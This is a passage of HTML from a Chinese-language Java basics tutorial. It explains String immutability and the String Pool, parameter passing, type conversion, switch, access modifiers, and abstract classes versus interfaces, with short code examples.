hash 值</strong></p><p>因为 String 的 hash 值经常被使用，例如 String 用做 HashMap 的 key。不可变的特性可以使得 hash 值也不可变，因此只需要进行一次计算。</p><p><strong>2. String Pool 的需要</strong></p><p>如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/f76067a5-7d5f-4135-9549-8199c77d8f1c.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/f76067a5-7d5f-4135-9549-8199c77d8f1c.jpg" alt="img"></a></p><p><strong>3. 安全性</strong></p><p>String 经常作为参数，String 不可变性可以保证参数不可变。例如在作为网络连接参数的情况下如果 String 是可变的，那么在网络连接过程中，String 被改变，改变 String 对象的那一方以为现在连接的是其它主机，而实际情况却不一定是。</p><p><strong>4. 线程安全</strong></p><p>String 不可变性天生具备线程安全，可以在多个线程中安全地使用。</p><p><a href="https://www.programcreek.com/2013/04/why-string-is-immutable-in-java/" target="_blank" rel="noopener">Program Creek : Why String is immutable in Java?</a></p><h2 id="String-StringBuffer-and-StringBuilder"><a href="#String-StringBuffer-and-StringBuilder" class="headerlink" title="String, StringBuffer and StringBuilder"></a>String, StringBuffer and StringBuilder</h2><p><strong>1. 可变性</strong></p><ul><li>String 不可变</li><li>StringBuffer 和 StringBuilder 可变</li></ul><p><strong>2. 线程安全</strong></p><ul><li>String 不可变，因此是线程安全的</li><li>StringBuilder 不是线程安全的</li><li>StringBuffer 是线程安全的，内部使用 synchronized 进行同步</li></ul><p><a href="https://stackoverflow.com/questions/2971315/string-stringbuffer-and-stringbuilder" target="_blank" rel="noopener">StackOverflow : String, StringBuffer, and StringBuilder</a></p><h2 id="String-Pool"><a href="#String-Pool" class="headerlink" title="String Pool"></a>String Pool</h2><p>字符串常量池（String Pool）保存着所有字符串字面量（literal strings），这些字面量在编译时期就确定。不仅如此，还可以使用 String 的 intern() 方法在运行过程中将字符串添加到 String Pool 中。</p><p>当一个字符串调用 intern() 方法时，如果 String Pool 中已经存在一个字符串和该字符串值相等（使用 equals() 方法进行确定），那么就会返回 String Pool 中字符串的引用；否则，就会在 String Pool 中添加一个新的字符串，并返回这个新字符串的引用。</p><p>下面示例中，s1 和 s2 采用 new String() 的方式新建了两个不同字符串，而 s3 和 s4 是通过 s1.intern() 方法取得一个字符串引用。intern() 首先把 s1 引用的字符串放到 String Pool 中，然后返回这个字符串引用。因此 s3 和 s4 引用的是同一个字符串。</p><pre class=" language-java"><code class="language-java">String s1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>String s2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s1 <span class="token operator">==</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// false</span>String s3 <span class="token operator">=</span> s1<span class="token punctuation">.</span><span class="token function">intern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>String s4 <span class="token operator">=</span> s1<span class="token punctuation">.</span><span class="token function">intern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s3 <span class="token operator">==</span> s4<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// true</span></code></pre><p>如果是采用 “bbb” 这种字面量的形式创建字符串，会自动地将字符串放入 String Pool 中。</p><pre class=" language-java"><code class="language-java">String s5 <span class="token operator">=</span> <span class="token string">"bbb"</span><span class="token punctuation">;</span>String s6 <span class="token operator">=</span> <span class="token string">"bbb"</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s5 <span class="token operator">==</span> s6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// true</span></code></pre><p>在 Java 7 之前，String Pool 被放在运行时常量池中，它属于永久代。而在 Java 7，String Pool 被移到堆中。这是因为永久代的空间有限，在大量使用字符串的场景下会导致 OutOfMemoryError 错误。</p><ul><li><a href="https://stackoverflow.com/questions/10578984/what-is-string-interning" target="_blank" rel="noopener">StackOverflow : What is String interning?</a></li><li><a href="https://tech.meituan.com/in_depth_understanding_string_intern.html" target="_blank" rel="noopener">深入解析 String#intern</a></li></ul><h2 id="new-String-“abc”"><a href="#new-String-“abc”" class="headerlink" title="new String(“abc”)"></a>new String(“abc”)</h2><p>使用这种方式一共会创建两个字符串对象（前提是 String Pool 中还没有 “abc” 字符串对象）。</p><ul><li>“abc” 属于字符串字面量，因此编译时期会在 String Pool 中创建一个字符串对象，指向这个 “abc” 字符串字面量；</li><li>而使用 new 的方式会在堆中创建一个字符串对象。</li></ul><p>创建一个测试类，其 main 方法中使用这种方式来创建字符串对象。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NewStringTest</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>使用 javap -verbose 进行反编译，得到以下内容：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// ...</span>Constant pool<span class="token operator">:</span><span class="token comment" spellcheck="true">// ...</span>   #<span class="token number">2</span> <span class="token operator">=</span> Class              #<span class="token number">18</span>            <span class="token comment" spellcheck="true">// java/lang/String</span>   #<span class="token number">3</span> <span class="token operator">=</span> String             #<span class="token number">19</span>            <span class="token comment" spellcheck="true">// abc</span><span class="token comment" spellcheck="true">// ...</span>  #<span class="token number">18</span> <span class="token operator">=</span> Utf8               java<span class="token operator">/</span>lang<span class="token operator">/</span>String  #<span class="token number">19</span> <span class="token operator">=</span> Utf8               abc<span class="token comment" spellcheck="true">// ...</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    descriptor<span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>Ljava<span class="token operator">/</span>lang<span class="token operator">/</span>String<span class="token punctuation">;</span><span class="token punctuation">)</span>V    flags<span class="token operator">:</span> ACC_PUBLIC<span class="token punctuation">,</span> ACC_STATIC    Code<span class="token operator">:</span>      stack<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> locals<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> args_size<span class="token operator">=</span><span class="token number">1</span>         <span class="token number">0</span><span class="token operator">:</span> <span class="token keyword">new</span>           #<span class="token number">2</span>                  <span class="token comment" spellcheck="true">// class java/lang/String</span>         <span class="token number">3</span><span class="token operator">:</span> dup         <span class="token number">4</span><span class="token operator">:</span> ldc           #<span class="token number">3</span>                  <span class="token comment" spellcheck="true">// String abc</span>         <span class="token number">6</span><span class="token operator">:</span> invokespecial #<span class="token number">4</span>                  <span class="token comment" spellcheck="true">// Method java/lang/String."&lt;init>":(Ljava/lang/String;)V</span>         <span class="token number">9</span><span class="token operator">:</span> astore_1<span class="token comment" spellcheck="true">// ...</span></code></pre><p>在 Constant Pool 中，#19 存储这字符串字面量 “abc”，#3 是 String Pool 的字符串对象，它指向 #19 这个字符串字面量。在 main 方法中，0: 行使用 new #2 在堆中创建一个字符串对象，并且使用 ldc #3 将 String Pool 中的字符串对象作为 String 构造函数的参数。</p><p>以下是 String 构造函数的源码，可以看到，在将一个字符串对象作为另一个字符串对象的构造函数参数时，并不会完全复制 value 数组内容，而是都会指向同一个 value 数组。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">String</span><span class="token punctuation">(</span>String original<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> original<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>hash <span class="token operator">=</span> original<span class="token punctuation">.</span>hash<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h1 id="三、运算"><a href="#三、运算" class="headerlink" title="三、运算"></a>三、运算</h1><h2 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h2><p>Java 的参数是以值传递的形式传入方法中，而不是引用传递。</p><p>以下代码中 Dog dog 的 dog 是一个指针，存储的是对象的地址。在将一个参数传入一个方法时，本质上是将对象的地址以值的方式传递到形参中。因此在方法中使指针引用其它对象，那么这两个指针此时指向的是完全不同的对象，在一方改变其所指向对象的内容时对另一方没有影响。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Dog</span> <span class="token punctuation">{</span>    String name<span class="token punctuation">;</span>    <span class="token function">Dog</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    String <span class="token function">getObjectAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PassByValueExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Dog dog <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dog<span class="token punctuation">.</span><span class="token function">getObjectAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Dog@4554617c</span>        <span class="token function">func</span><span class="token punctuation">(</span>dog<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dog<span class="token punctuation">.</span><span class="token function">getObjectAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Dog@4554617c</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dog<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// A</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span>Dog dog<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dog<span class="token punctuation">.</span><span class="token function">getObjectAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Dog@4554617c</span>        dog <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dog<span class="token punctuation">.</span><span class="token function">getObjectAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Dog@74a14482</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dog<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// B</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>如果在方法中改变对象的字段值会改变原对象该字段值，因为改变的是同一个地址指向的内容。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">PassByValueExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Dog dog <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">func</span><span class="token punctuation">(</span>dog<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dog<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// B</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span>Dog dog<span class="token punctuation">)</span> <span class="token punctuation">{</span>        dog<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><a href="https://stackoverflow.com/questions/40480/is-java-pass-by-reference-or-pass-by-value" target="_blank" rel="noopener">StackOverflow: Is Java “pass-by-reference” or “pass-by-value”?</a></p><h2 id="float-与-double"><a href="#float-与-double" class="headerlink" title="float 与 double"></a>float 与 double</h2><p>Java 不能隐式执行向下转型，因为这会使得精度降低。</p><p>1.1 字面量属于 double 类型，不能直接将 1.1 直接赋值给 float 变量，因为这是向下转型。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// float f = 1.1;</span></code></pre><p>1.1f 字面量才是 float 类型。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">float</span> f <span class="token operator">=</span> <span class="token number">1.1f</span><span class="token punctuation">;</span></code></pre><h2 id="隐式类型转换"><a href="#隐式类型转换" class="headerlink" title="隐式类型转换"></a>隐式类型转换</h2><p>因为字面量 1 是 int 类型，它比 short 类型精度要高，因此不能隐式地将 int 类型下转型为 short 类型。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">short</span> s1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// s1 = s1 + 1;</span></code></pre><p>但是使用 += 或者 ++ 运算符可以执行隐式类型转换。</p><pre class=" language-java"><code class="language-java">s1 <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// s1++;</span></code></pre><p>上面的语句相当于将 s1 + 1 的计算结果进行了向下转型：</p><pre><code>s1 = (short) (s1 + 1);</code></pre><p><a href="https://stackoverflow.com/questions/8710619/why-dont-javas-compound-assignment-operators-require-casting" target="_blank" rel="noopener">StackOverflow : Why don’t Java’s +=, -=, *=, /= compound assignment operators require casting?</a></p><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><p>从 Java 7 开始，可以在 switch 条件判断语句中使用 String 对象。</p><pre class=" language-java"><code class="language-java">String s <span class="token operator">=</span> <span class="token string">"a"</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token string">"a"</span><span class="token operator">:</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token string">"b"</span><span class="token operator">:</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"bbb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>switch 不支持 long，是因为 switch 的设计初衷是对那些只有少数的几个值进行等值判断，如果值过于复杂，那么还是用 if 比较合适。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// long x = 111;</span><span class="token comment" spellcheck="true">// switch (x) { // Incompatible types. Found: 'long', required: 'char, byte, short, int, Character, Byte, Short, Integer, String, or an enum'</span><span class="token comment" spellcheck="true">//     case 111:</span><span class="token comment" spellcheck="true">//         System.out.println(111);</span><span class="token comment" spellcheck="true">//         break;</span><span class="token comment" spellcheck="true">//     case 222:</span><span class="token comment" spellcheck="true">//         System.out.println(222);</span><span class="token comment" spellcheck="true">//         break;</span><span class="token comment" spellcheck="true">// }</span></code></pre><p><a href="https://stackoverflow.com/questions/2676210/why-cant-your-switch-statement-data-type-be-long-java" target="_blank" rel="noopener">StackOverflow : Why can’t your switch statement data type be long, Java?</a></p><h1 id="四、继承"><a href="#四、继承" class="headerlink" title="四、继承"></a>四、继承</h1><h2 id="访问权限"><a href="#访问权限" class="headerlink" title="访问权限"></a>访问权限</h2><p>Java 中有三个访问权限修饰符：private、protected 以及 public，如果不加访问修饰符，表示包级可见。</p><p>可以对类或类中的成员（字段以及方法）加上访问修饰符。</p><ul><li>类可见表示其它类可以用这个类创建实例对象。</li><li>成员可见表示其它类可以用这个类的实例对象访问到该成员；</li></ul><p>protected 用于修饰成员，表示在继承体系中成员对于子类可见，但是这个访问修饰符对于类没有意义。</p><p>设计良好的模块会隐藏所有的实现细节，把它的 API 与它的实现清晰地隔离开来。模块之间只通过它们的 API 进行通信，一个模块不需要知道其他模块的内部工作情况，这个概念被称为信息隐藏或封装。因此访问权限应当尽可能地使每个类或者成员不被外界访问。</p><p>如果子类的方法重写了父类的方法，那么子类中该方法的访问级别不允许低于父类的访问级别。这是为了确保可以使用父类实例的地方都可以使用子类实例，也就是确保满足里氏替换原则。</p><p>字段决不能是公有的，因为这么做的话就失去了对这个字段修改行为的控制，客户端可以对其随意修改。例如下面的例子中，AccessExample 拥有 id 公有字段，如果在某个时刻，我们想要使用 int 存储 id 字段，那么就需要修改所有的客户端代码。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AccessExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String id<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可以使用公有的 getter 和 setter 方法来替换公有字段，这样的话就可以控制对字段的修改行为。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AccessExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>    <span class="token keyword">public</span> String <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> id <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setId</span><span class="token punctuation">(</span>String id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>但是也有例外，如果是包级私有的类或者私有的嵌套类，那么直接暴露成员不会有特别大的影响。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AccessWithInnerClassExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">InnerClass</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> InnerClass innerClass<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">AccessWithInnerClassExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        innerClass <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InnerClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> innerClass<span class="token punctuation">.</span>x<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 直接访问</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="抽象类与接口"><a href="#抽象类与接口" class="headerlink" title="抽象类与接口"></a>抽象类与接口</h2><p><strong>1. 抽象类</strong></p><p>抽象类和抽象方法都使用 abstract 关键字进行声明。抽象类一般会包含抽象方法，抽象方法一定位于抽象类中。</p><p>抽象类和普通类最大的区别是，抽象类不能被实例化，需要继承抽象类才能实例化其子类。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractClassExample</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">int</span> x<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> y<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"func2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AbstractExtendClassExample</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractClassExample</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"func1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// AbstractClassExample ac1 = new AbstractClassExample(); // 'AbstractClassExample' is abstract; cannot be instantiated</span>AbstractClassExample ac2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AbstractExtendClassExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ac2<span class="token punctuation">.</span><span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>2. 接口</strong></p><p>接口是抽象类的延伸，在 Java 8 之前，它可以看成是一个完全抽象的类，也就是说它不能有任何的方法实现。</p><p>从 Java 8 开始，接口也可以拥有默认的方法实现，这是因为不支持默认方法的接口的维护成本太高了。在 Java 8 之前，如果一个接口想要添加新的方法，那么要修改所有实现了该接口的类。</p><p>接口的成员（字段 + 方法）默认都是 public 的，并且不允许定义为 private 或者 protected。</p><p>接口的字段默认都是 static 和 final 的。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">InterfaceExample</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span> <span class="token keyword">void</span> <span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"func2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// int y;               // Variable 'y' might not have been initialized</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> z <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// Modifier 'public' is redundant for interface fields</span>    <span class="token comment" spellcheck="true">// private int k = 0;   // Modifier 'private' not allowed here</span>    <span class="token comment" spellcheck="true">// protected int l = 0; // Modifier 'protected' not allowed here</span>    <span class="token comment" spellcheck="true">// private void fun3(); // Modifier 'private' not allowed here</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InterfaceImplementExample</span> <span class="token keyword">implements</span> <span class="token class-name">InterfaceExample</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"func1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// InterfaceExample ie1 = new InterfaceExample(); // 'InterfaceExample' is abstract; cannot be instantiated</span>InterfaceExample ie2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InterfaceImplementExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ie2<span class="token punctuation">.</span><span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>InterfaceExample<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>3. 比较</strong></p><ul><li>从设计层面上看，抽象类提供了一种 IS-A 关系，那么就必须满足里式替换原则，即子类对象必须能够替换掉所有父类对象。而接口更像是一种 LIKE-A 关系，它只是提供一种方法实现契约，并不要求接口和实现接口的类具有 IS-A 关系。</li><li>从使用上来看，一个类可以实现多个接口，但是不能继承多个抽象类。</li><li>接口的字段只能是 static 和 final 类型的，而抽象类的字段没有这种限制。</li><li>接口的成员只能是 public 的，而抽象类的成员可以有多种访问权限。</li></ul><p><strong>4. 使用选择</strong></p><p>使用接口：</p><ul><li>需要让不相关的类都实现一个方法，例如不相关的类都可以实现 Compareable 接口中的 compareTo() 方法；</li><li>需要使用多重继承。</li></ul><p>使用抽象类：</p><ul><li>需要在几个相关的类中共享代码。</li><li>需要能控制继承来的成员的访问权限，而不是都为 public。</li><li>需要继承非静态和非常量字段。</li></ul><p>在很多情况下，接口优先于抽象类。因为接口没有抽象类严格的类层次结构要求，可以灵活地为一个类添加行为。并且从 Java 8 开始，接口也可以有默认的方法实现，使得修改接口的成本也变的很低。</p><ul><li><a href="https://www.ibm.com/developerworks/cn/java/l-javainterface-abstract/" target="_blank" rel="noopener">深入理解 abstract class 和 interface</a></li><li><a href="https://dzone.com/articles/when-to-use-abstract-class-and-intreface" target="_blank" rel="noopener">When to Use Abstract Class and Interface</a></li></ul><h2 id="super"><a href="#super" class="headerlink" title="super"></a>super</h2><ul><li>访问父类的构造函数：可以使用 super() 